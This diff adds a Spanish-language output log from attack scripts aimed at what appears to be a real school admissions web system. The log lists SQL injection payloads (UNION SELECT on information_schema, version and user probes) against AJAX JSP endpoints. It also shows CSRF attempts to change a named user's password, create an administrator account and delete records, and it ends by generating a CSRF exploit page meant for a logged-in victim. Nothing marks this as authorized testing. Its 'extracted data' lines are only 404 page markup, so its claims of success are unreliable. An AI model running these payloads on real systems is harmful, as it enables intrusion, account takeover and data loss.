@@ -1,0 +1,430 @@
+Script de Explotación del Endpoint AJAX:
+
+=== EXPLOTACIÓN ENDPOINT AJAX ===
+[*] Explotando endpoint AJAX de bachilleratos...
+
+[+] Probando: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp
+    Payload: 1...
+    Status: 200, Tamaño: 29
+      Respuesta:
+
+
+1¬INSTITUTO OCTAVIO PAZ...
+    Payload: 1' OR '1'='1'--...
+    Status: 404, Tamaño: 1368
+    Payload: 1 UNION SELECT 1,2,3--...
+    Status: 404, Tamaño: 1368
+    Payload: 1 UNION SELECT database(),user(),version()--...
+    Status: 404, Tamaño: 1368
+    Payload: 1 UNION SELECT table_name,table_schema,3 FROM info...
+    Status: 404, Tamaño: 1368
+    Payload: 1 UNION SELECT column_name,2,3 FROM information_sc...
+    Status: 404, Tamaño: 1368
+    Payload: 1' AND 1=CAST((SELECT version()) AS INT)--...
+    Status: 404, Tamaño: 1368
+
+[+] Probando: /jsp/escolar/muestra_bachillerato_ajax.jsp
+    Payload: 1...
+    Status: 200, Tamaño: 29
+      Respuesta:
+
+
+1,INSTITUTO OCTAVIO PAZ...
+    Payload: 1' OR '1'='1'--...
+    Status: 500, Tamaño: 1334
+    Payload: 1 UNION SELECT 1,2,3--...
+    Status: 500, Tamaño: 1334
+    Payload: 1 UNION SELECT database(),user(),version()--...
+    Status: 500, Tamaño: 1334
+    Payload: 1 UNION SELECT table_name,table_schema,3 FROM info...
+    Status: 500, Tamaño: 1334
+    Payload: 1 UNION SELECT column_name,2,3 FROM information_sc...
+    Status: 500, Tamaño: 1334
+    Payload: 1' AND 1=CAST((SELECT version()) AS INT)--...
+    Status: 500, Tamaño: 1334
+
+[*] Extrayendo datos via AJAX...
+
+[+] Payload 1: 1 UNION SELECT @@version,@@hostname,@@datadir--...
+    Respuesta:
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Información Táctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cel...
+    [!] Dato extraído: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    [!] Dato extraído: <html xmlns="http://www.w3.org/1999/xhtml">
+    [!] Dato extraído: <head>
+    [!] Dato extraído: <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    [!] Dato extraído: <title> Sistema de Información Táctico Operativo </title>
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+    [!] Dato extraído: </head>
+    [!] Dato extraído: <body>
+    [!] Dato extraído: <form name="forma" method="post" action="">
+    [!] Dato extraído: <br>
+    [!] Dato extraído: <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <th class="CeldaDatosTitulo"> Error 404</th>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <colgroup>
+    [!] Dato extraído: <col width="20%"> <col width="80%">
+    [!] Dato extraído: </colgroup>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td align="center"> <img src="/images/error404.png"> </td>
+    [!] Dato extraído: <td><b> Error 404, página no encontrada, por favor reportarlo al departamento de Sistemas Informáticos</b></td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: </form>
+    [!] Dato extraído: </body>
+    [!] Dato extraído: </html>
+
+[+] Payload 2: 1 UNION SELECT user(),database(),version()--...
+    Respuesta:
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Información Táctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cel...
+    [!] Dato extraído: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    [!] Dato extraído: <html xmlns="http://www.w3.org/1999/xhtml">
+    [!] Dato extraído: <head>
+    [!] Dato extraído: <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    [!] Dato extraído: <title> Sistema de Información Táctico Operativo </title>
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+    [!] Dato extraído: </head>
+    [!] Dato extraído: <body>
+    [!] Dato extraído: <form name="forma" method="post" action="">
+    [!] Dato extraído: <br>
+    [!] Dato extraído: <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <th class="CeldaDatosTitulo"> Error 404</th>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <colgroup>
+    [!] Dato extraído: <col width="20%"> <col width="80%">
+    [!] Dato extraído: </colgroup>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td align="center"> <img src="/images/error404.png"> </td>
+    [!] Dato extraído: <td><b> Error 404, página no encontrada, por favor reportarlo al departamento de Sistemas Informáticos</b></td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: </form>
+    [!] Dato extraído: </body>
+    [!] Dato extraído: </html>
+
+[+] Payload 3: 1 UNION SELECT table_name,table_rows,table_comment FROM info...
+    Respuesta:
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Información Táctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cel...
+    [!] Dato extraído: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    [!] Dato extraído: <html xmlns="http://www.w3.org/1999/xhtml">
+    [!] Dato extraído: <head>
+    [!] Dato extraído: <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    [!] Dato extraído: <title> Sistema de Información Táctico Operativo </title>
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+    [!] Dato extraído: </head>
+    [!] Dato extraído: <body>
+    [!] Dato extraído: <form name="forma" method="post" action="">
+    [!] Dato extraído: <br>
+    [!] Dato extraído: <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <th class="CeldaDatosTitulo"> Error 404</th>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <colgroup>
+    [!] Dato extraído: <col width="20%"> <col width="80%">
+    [!] Dato extraído: </colgroup>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td align="center"> <img src="/images/error404.png"> </td>
+    [!] Dato extraído: <td><b> Error 404, página no encontrada, por favor reportarlo al departamento de Sistemas Informáticos</b></td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: </form>
+    [!] Dato extraído: </body>
+    [!] Dato extraído: </html>
+
+[+] Payload 4: 1 UNION SELECT table_name,2,3 FROM information_schema.tables...
+    Respuesta:
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Información Táctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cel...
+    [!] Dato extraído: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    [!] Dato extraído: <html xmlns="http://www.w3.org/1999/xhtml">
+    [!] Dato extraído: <head>
+    [!] Dato extraído: <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    [!] Dato extraído: <title> Sistema de Información Táctico Operativo </title>
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+    [!] Dato extraído: </head>
+    [!] Dato extraído: <body>
+    [!] Dato extraído: <form name="forma" method="post" action="">
+    [!] Dato extraído: <br>
+    [!] Dato extraído: <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <th class="CeldaDatosTitulo"> Error 404</th>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <colgroup>
+    [!] Dato extraído: <col width="20%"> <col width="80%">
+    [!] Dato extraído: </colgroup>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td align="center"> <img src="/images/error404.png"> </td>
+    [!] Dato extraído: <td><b> Error 404, página no encontrada, por favor reportarlo al departamento de Sistemas Informáticos</b></td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: </form>
+    [!] Dato extraído: </body>
+    [!] Dato extraído: </html>
+
+[+] Payload 5: 1 UNION SELECT table_name,2,3 FROM information_schema.tables...
+    Respuesta:
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Información Táctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cel...
+    [!] Dato extraído: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    [!] Dato extraído: <html xmlns="http://www.w3.org/1999/xhtml">
+    [!] Dato extraído: <head>
+    [!] Dato extraído: <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    [!] Dato extraído: <title> Sistema de Información Táctico Operativo </title>
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+    [!] Dato extraído: </head>
+    [!] Dato extraído: <body>
+    [!] Dato extraído: <form name="forma" method="post" action="">
+    [!] Dato extraído: <br>
+    [!] Dato extraído: <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <th class="CeldaDatosTitulo"> Error 404</th>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <colgroup>
+    [!] Dato extraído: <col width="20%"> <col width="80%">
+    [!] Dato extraído: </colgroup>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td align="center"> <img src="/images/error404.png"> </td>
+    [!] Dato extraído: <td><b> Error 404, página no encontrada, por favor reportarlo al departamento de Sistemas Informáticos</b></td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: </form>
+    [!] Dato extraído: </body>
+    [!] Dato extraído: </html>
+
+[+] Payload 6: 1 UNION SELECT table_name,2,3 FROM information_schema.tables...
+    Respuesta:
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Información Táctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cel...
+    [!] Dato extraído: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    [!] Dato extraído: <html xmlns="http://www.w3.org/1999/xhtml">
+    [!] Dato extraído: <head>
+    [!] Dato extraído: <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    [!] Dato extraído: <title> Sistema de Información Táctico Operativo </title>
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+    [!] Dato extraído: </head>
+    [!] Dato extraído: <body>
+    [!] Dato extraído: <form name="forma" method="post" action="">
+    [!] Dato extraído: <br>
+    [!] Dato extraído: <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <th class="CeldaDatosTitulo"> Error 404</th>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <colgroup>
+    [!] Dato extraído: <col width="20%"> <col width="80%">
+    [!] Dato extraído: </colgroup>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td align="center"> <img src="/images/error404.png"> </td>
+    [!] Dato extraído: <td><b> Error 404, página no encontrada, por favor reportarlo al departamento de Sistemas Informáticos</b></td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: </form>
+    [!] Dato extraído: </body>
+    [!] Dato extraído: </html>
+
+[+] Payload 7: 1 UNION SELECT column_name,data_type,column_default FROM inf...
+    Respuesta:
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Información Táctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cel...
+    [!] Dato extraído: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    [!] Dato extraído: <html xmlns="http://www.w3.org/1999/xhtml">
+    [!] Dato extraído: <head>
+    [!] Dato extraído: <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    [!] Dato extraído: <title> Sistema de Información Táctico Operativo </title>
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+    [!] Dato extraído: <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+    [!] Dato extraído: </head>
+    [!] Dato extraído: <body>
+    [!] Dato extraído: <form name="forma" method="post" action="">
+    [!] Dato extraído: <br>
+    [!] Dato extraído: <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <th class="CeldaDatosTitulo"> Error 404</th>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+    [!] Dato extraído: <colgroup>
+    [!] Dato extraído: <col width="20%"> <col width="80%">
+    [!] Dato extraído: </colgroup>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td align="center"> <img src="/images/error404.png"> </td>
+    [!] Dato extraído: <td><b> Error 404, página no encontrada, por favor reportarlo al departamento de Sistemas Informáticos</b></td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: <tr class="CeldaDatos">
+    [!] Dato extraído: <td colspan="2">&nbsp;  </td>
+    [!] Dato extraído: </tr>
+    [!] Dato extraído: </table>
+    [!] Dato extraído: </form>
+    [!] Dato extraído: </body>
+    [!] Dato extraído: </html>
+
+Script de Explotación de Parámetros Ocultos:
+
+=== EXPLOTACIÓN PARÁMETROS OCULTOS ===
+[*] Explotando parámetros ocultos...
+
+[+] Probando URL: /jsp/index.jsp
+
+[+] Probando URL: /jsp/escolar/proceso_admision/proceso_interesado.jsp
+
+[+] Probando URL: /jsp/login.jsp
+
+[*] Manipulando parámetros de sesión...
+
+Script de Explotación CSRF:
+
+=== EXPLOTACIÓN CSRF ===
+[*] Probando vulnerabilidad CSRF...
+
+[+] Probando: Cambio de contraseña de hnieto
+    URL: /jsp/admin/cambiar_password.jsp
+    Status: 404
+    Tamaño respuesta: 1368
+    [-] Error en la acción
+
+[+] Probando: Creación de usuario administrador
+    URL: /jsp/admin/crear_usuario.jsp
+    Status: 404
+    Tamaño respuesta: 1368
+    [-] Error en la acción
+
+[+] Probando: Eliminación de registro
+    URL: /jsp/escolar/proceso_admision/eliminar_registro.jsp
+    Status: 404
+    Tamaño respuesta: 1368
+    [-] Error en la acción
+
+[*] Creando página de explotación CSRF...
+[+] Página CSRF creada: csrf_exploit.html
+[!] Abre este archivo en un navegador donde la víctima tenga sesión activa
+
